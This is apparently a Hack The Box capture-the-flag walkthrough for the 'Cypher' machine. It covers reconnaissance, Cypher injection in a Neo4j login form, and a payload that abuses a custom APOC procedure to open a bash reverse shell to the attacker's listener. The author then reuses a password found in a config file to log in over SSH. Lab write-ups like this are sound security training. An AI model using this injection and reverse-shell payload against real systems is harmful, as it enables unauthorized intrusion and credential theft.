# Cypher
HTB-Cypher

└─# nmap -sS 10.10.11.57

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

└─# nano /etc/hosts
10.10.11.57 cypher.htb

└─# dirsearch -u "http://cypher.htb" -t 50

**[11:35:00] Starting:                                                                                                
[11:35:10] 200 -    5KB - /about                                            
[11:35:10] 200 -    5KB - /about.html                                       
[11:35:25] 307 -    0B  - /api  ->  /api/docs                               
[11:35:25] 404 -   22B  - /api-docs
[11:35:25] 404 -   22B  - /api.log
[11:35:25] 404 -   22B  - /api.py
[11:35:25] 404 -   22B  - /api-doc
[11:35:25] 404 -   22B  - /api/__swagger__/
[11:35:25] 404 -   22B  - /api.php                                          
[11:35:25] 404 -   22B  - /api/2/explore/                                   
[11:35:25] 307 -    0B  - /api/  ->  http://cypher.htb/api/api
[11:35:25] 404 -   22B  - /api/_swagger_/
[11:35:25] 404 -   22B  - /api/apidocs
[11:35:25] 404 -   22B  - /api/api
[11:35:25] 404 -   22B  - /api/api-docs
[11:35:25] 404 -   22B  - /api/2/issue/createmeta
[11:35:25] 404 -   22B  - /api/application.wadl
[11:35:25] 404 -   22B  - /api/cask/graphql
[11:35:25] 404 -   22B  - /api/batch
[11:35:25] 404 -   22B  - /api/config
[11:35:25] 404 -   22B  - /api/apidocs/swagger.json
[11:35:25] 404 -   22B  - /api/docs/
[11:35:25] 404 -   22B  - /api/error_log
[11:35:25] 404 -   22B  - /api/jsonws/invoke                                
[11:35:25] 404 -   22B  - /api/login.json
[11:35:25] 404 -   22B  - /api/package_search/v4/documentation
[11:35:25] 404 -   22B  - /api/proxy
[11:35:25] 404 -   22B  - /api/spec/swagger.json                            
[11:35:25] 404 -   22B  - /api/swagger                                      
[11:35:25] 404 -   22B  - /api/snapshots
[11:35:25] 404 -   22B  - /api/swagger.yaml
[11:35:25] 404 -   22B  - /api/swagger.json
[11:35:25] 404 -   22B  - /api/swagger/ui/index
[11:35:25] 404 -   22B  - /api/swagger/swagger
[11:35:25] 404 -   22B  - /api/swagger.yml
[11:35:25] 404 -   22B  - /api/docs
[11:35:25] 404 -   22B  - /api/profile
[11:35:25] 404 -   22B  - /api/v1/swagger.json
[11:35:25] 404 -   22B  - /api/jsonws
[11:35:25] 404 -   22B  - /api/v1/                                          
[11:35:25] 404 -   22B  - /api/v2
[11:35:25] 404 -   22B  - /api/timelion/run
[11:35:25] 404 -   22B  - /api/v1
[11:35:25] 404 -   22B  - /api/v1/swagger.yaml
[11:35:25] 404 -   22B  - /api/v2/
[11:35:25] 404 -   22B  - /api/v2/swagger.json
[11:35:25] 404 -   22B  - /api/v2/swagger.yaml
[11:35:25] 404 -   22B  - /api/v2/helpdesk/discover
[11:35:25] 404 -   22B  - /api/v3
[11:35:25] 404 -   22B  - /api/whoami
[11:35:25] 404 -   22B  - /apidoc
[11:35:25] 404 -   22B  - /api/v4
[11:35:25] 404 -   22B  - /api/version
[11:35:25] 404 -   22B  - /apis
[11:35:25] 404 -   22B  - /apiserver-aggregator-ca.cert
[11:35:25] 404 -   22B  - /apibuild.pyc
[11:35:25] 404 -   22B  - /apiserver-aggregator.key
[11:35:25] 404 -   22B  - /apiserver-client.crt
[11:35:25] 404 -   22B  - /apiserver-key.pem
[11:35:25] 404 -   22B  - /api/vendor/phpunit/phpunit/phpunit
[11:35:25] 404 -   22B  - /apiserver-aggregator.cert
[11:35:25] 404 -   22B  - /apidocs
[11:35:37] 404 -   22B  - /demo.aspx                                        
[11:35:37] 307 -    0B  - /demo/  ->  http://cypher.htb/api/demo            
[11:35:37] 307 -    0B  - /demo  ->  /login                                 
[11:35:37] 404 -   22B  - /demo.php                                         
[11:35:37] 404 -   22B  - /demo.js
[11:35:37] 404 -   22B  - /demos/
[11:35:37] 404 -   22B  - /demo/ojspext/events/globals.jsa                  
[11:35:37] 404 -   22B  - /demo.jsp                                         
[11:35:37] 404 -   22B  - /demo/sql/index.jsp                               
[11:35:37] 404 -   22B  - /demoadmin                                        
[11:35:53] 200 -    4KB - /login                                            
[11:35:53] 200 -    4KB - /login.html                                       
[11:36:29] 301 -  178B  - /testing  ->  http://cypher.htb/testing/ **

Find http://cypher.htb/testing/ 

Go to http://cypher.htb/testing/

Find custom-apoc-extension-1.0-SNAPSHOT.jar 

Extract .jar and find Neo4j Database

Find lot of Neo4j exploit database and Cypher Injection

Open Burpsuite

Try
{
    "username": "admin'",
    "password": "123"
}

HTTP/1.1 400 Bad Request
Server: nginx/1.24.0 (Ubuntu)
Date: Mon, 31 Mar 2025 10:37:13 GMT
Content-Length: 3457
Connection: keep-alive

.
.
.
 {message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 60 (offset: 59))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin'' return h.value as hash"
                                                            ^}

After long long reseach I try this injection I try user and not admin and push in the injection the RCE :

{
    "username": "user' return h.value as a union CALL custom.getUrlStatusCode(\"http://cypher.htb; bash -c 'bash -i >& /dev/tcp/10.10.X.X/4444 0>&1'\") YIELD statusCode AS a RETURN a;//",
    "password": "123"
}

And Go it !

└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.X.X] from (UNKNOWN) [10.10.11.57] XXXXX
blablablabla
neo4j@cypher:/$ 

Let's go now, research little flag user.txt

neo4j@cypher:/$ ls
ls
bin
bin.usr-is-merged
boot
cdrom
dev
etc
home
lib
lib64
lib.usr-is-merged
lost+found
media
mnt
opt
proc
root
run
sbin
sbin.usr-is-merged
srv
sys
tmp
usr
var

Go home

neo4j@cypher:/$ cd /home

cd /home

neo4j@cypher:/home$ ls

graphasm

neo4j@cypher:/home$ cd graphasm

neo4j@cypher:/home/graphasm$ ls
bbot_preset.yml
user.txt

neo4j@cypher:/home/graphasm$ cat user.txt
cat: user.txt: Permission denied

hmm ok this is medium machine you know haha
but ..

neo4j@cypher:/home/graphasm$ ls -la                  

total 36
drwxr-xr-x 4 graphasm graphasm 4096 Feb 17 12:40 .
drwxr-xr-x 3 root     root     4096 Oct  8 17:58 ..
lrwxrwxrwx 1 root     root        9 Oct  8 18:06 .bash_history -> /dev/null
-rw-r--r-- 1 graphasm graphasm  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 graphasm graphasm 3771 Mar 31  2024 .bashrc
-rw-r--r-- 1 graphasm graphasm  156 Feb 14 12:35 bbot_preset.yml
drwx------ 2 graphasm graphasm 4096 Oct  8 17:58 .cache
-rw-r--r-- 1 graphasm graphasm  807 Mar 31  2024 .profile
drwx------ 2 graphasm graphasm 4096 Oct  8 17:58 .ssh
-rw-r----- 1 root     graphasm   33 Mar 31 04:09 user.txt

neo4j@cypher:/home/graphasm$ cat bbot_preset.yml
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.xxxxxxxxxxxxx

Got it password ! 

Go to ssh connect from graphasm

└─# ssh graphasm@10.10.11.57
put password neo4j

.
.
And 
let'sgo
graphasm@cypher:~$ ls
bbot_preset.yml  user.txt

graphasm@cypher:~$ cat user.txt 
XXXXXXXXXXXXXXXXXXXXXXXXXXX


